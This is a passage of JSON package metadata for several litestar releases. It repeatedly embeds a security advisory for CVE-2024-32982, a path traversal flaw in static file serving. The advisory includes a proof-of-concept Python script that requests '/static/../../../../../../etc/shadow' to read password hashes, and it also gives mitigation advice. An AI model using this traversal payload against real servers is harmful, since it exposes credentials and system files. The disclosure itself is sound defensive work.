attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.7.1":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.7.1/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<1.0.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.7.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"457f11c89825fbd649e2edfb2cf0c43f6aaf951ba24d0a1dae5328d4f86474ba","md5":"5e6d2459d152236f8b725a784db315b9","sha256":"5ce44e2b66f99f7de615a2a5ac20c8eab959eb0a1bd3eb52015e750fad973cc2"},"downloads":-1,"filename":"litestar-2.7.1-py3-none-any.whl","has_sig":false,"md5_digest":"5e6d2459d152236f8b725a784db315b9","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":511980,"upload_time":"2024-03-27T06:56:15","upload_time_iso_8601":"2024-03-27T06:56:15.180445Z","url":"https://files.pythonhosted.org/packages/45/7f/11c89825fbd649e2edfb2cf0c43f6aaf951ba24d0a1dae5328d4f86474ba/litestar-2.7.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8c32a92fedfa7bec4ee847353bea31025472a0639dd2435c3352253dcfa6f758","md5":"1b042f3fec2ec3b687721b4ebd98d6c3","sha256":"df3f9ebd4e42d410017575dc1e502e7bf01fe216e8846ae21dc7444d57e80658"},"downloads":-1,"filename":"litestar-2.7.1.tar.gz","has_sig":false,"md5_digest":"1b042f3fec2ec3b687721b4ebd98d6c3","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":662919,"upload_time":"2024-03-27T06:56:17","upload_time_iso_8601":"2024-03-27T06:56:17.007109Z","url":"https://files.pythonhosted.org/packages/8c/32/a92fedfa7bec4ee847353bea31025472a0639dd2435c3352253dcfa6f758/litestar-2.7.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.7.2":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.7.2/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy<1.0.0,>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<1.0.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.7.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"374f4c57305e9f1cce5c56c4dfc897e56fec5b4b7c80aede18b9ad1661e0d7b6","md5":"98236d45c25d135bce450944ba2475a1","sha256":"3cc455871856f732bc8c475bf7850c297469e273f32f0246dd7d24b66a1d9a7e"},"downloads":-1,"filename":"litestar-2.7.2-py3-none-any.whl","has_sig":false,"md5_digest":"98236d45c25d135bce450944ba2475a1","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":512198,"upload_time":"2024-05-06T07:19:50","upload_time_iso_8601":"2024-05-06T07:19:50.905117Z","url":"https://files.pythonhosted.org/packages/37/4f/4c57305e9f1cce5c56c4dfc897e56fec5b4b7c80aede18b9ad1661e0d7b6/litestar-2.7.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e97fd8ea961b7ec533ec1d5dd7db36808a4e432f3a860e2eb0e34a6409a8cf93","md5":"832b73df9b468e9d2659e39d5d355ca9","sha256":"bebc3cf67084a15f495fc859c7d557fcfc52e77f4465144802dba9240735ac16"},"downloads":-1,"filename":"litestar-2.7.2.tar.gz","has_sig":false,"md5_digest":"832b73df9b468e9d2659e39d5d355ca9","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":664158,"upload_time":"2024-05-06T07:19:53","upload_time_iso_8601":"2024-05-06T07:19:53.109260Z","url":"https://files.pythonhosted.org/packages/e9/7f/d8ea961b7ec533ec1d5dd7db36808a4e432f3a860e2eb0e34a6409a8cf93/litestar-2.7.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.8.0":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <provinzkraut@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.8.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<0.9.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.8.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"7b25d447d7abb16f602ce2726df2463509266a2b65e53144abf9506179173397","md5":"44127d91e998655ce584d0c9b093e351","sha256":"1b9a326953639a72c48c8720c8d7f2a1724087d037b484214b0c79bd75d36ea7"},"downloads":-1,"filename":"litestar-2.8.0-py3-none-any.whl","has_sig":false,"md5_digest":"44127d91e998655ce584d0c9b093e351","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":522901,"upload_time":"2024-04-05T20:33:42","upload_time_iso_8601":"2024-04-05T20:33:42.930256Z","url":"https://files.pythonhosted.org/packages/7b/25/d447d7abb16f602ce2726df2463509266a2b65e53144abf9506179173397/litestar-2.8.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"44aa9f73bb16ace7a3286c4abe9a95b8eba1637c100855653ca2015ab4c389ce","md5":"261b013a4af76636126df9e44847d2b5","sha256":"d7f7fa5b0303e50868edaf0b640f67b0f59f1ed088da1730da14ae14ef10e2fb"},"downloads":-1,"filename":"litestar-2.8.0.tar.gz","has_sig":false,"md5_digest":"261b013a4af76636126df9e44847d2b5","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":677457,"upload_time":"2024-04-05T20:33:51","upload_time_iso_8601":"2024-04-05T20:33:51.124619Z","url":"https://files.pythonhosted.org/packages/44/aa/9f73bb16ace7a3286c4abe9a95b8eba1637c100855653ca2015ab4c389ce/litestar-2.8.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular 